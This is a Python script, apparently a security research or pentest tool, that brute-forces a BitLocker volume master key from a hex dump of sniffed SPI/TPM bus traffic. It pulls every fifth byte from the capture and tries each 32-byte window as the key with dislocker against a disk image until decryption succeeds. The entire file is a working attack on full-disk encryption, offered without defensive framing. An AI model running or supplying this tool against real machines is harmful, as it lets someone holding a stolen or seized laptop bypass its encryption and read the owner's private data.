import argparse
import subprocess
from tqdm import tqdm
import os
def main(args):
    ## Read the spi DUMP
    cmd = "dislocker -r -V "+args.d+" -O "+args.o + " -K ./VMK -- " + args.m 
    print('[i] Dislocker CMD: ' + cmd)
    print('[i] Reading file '+args.c)
    with open(args.c,'r') as e:
        miso = e.readlines()[0]
    i = 0
    data=b''
    b = 1
    # We need to take every five bytes
    while i < len(miso):
        if b % 5 == 0:
            data+=bytes.fromhex(miso[i:i+2])
        b+=1
        i+=2
    number = (len(data) -32)
    progress_bar = tqdm(total=number, unit='iteration')
    i = 0
    while i < len(data)-32:
        key = data[i:i+32]
        w = open('./VMK', 'wb')
        w.write(key)
        w.flush()
        w.close()
        os.sync()
        progress_bar.update(1)
        i+=1
        result = subprocess.run(cmd.split(), capture_output=True)
        if b'decrypt correctly' not in result.stdout:
            print(result.stdout.decode('utf-8'))
            if result.returncode == 0:
                print("[+] Key found!")
                print("[i] Key is stored in VMK file")
            break



msg = "Brute force for Bitlocker SPI dump"
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description = msg)
    parser.add_argument("-d", help="Disk image")
    parser.add_argument("-o", help="Offset")
    parser.add_argument("-m", help="Mount point for dislocker")
    parser.add_argument('-c', help="Input file")
    args = parser.parse_args()
    main(args)
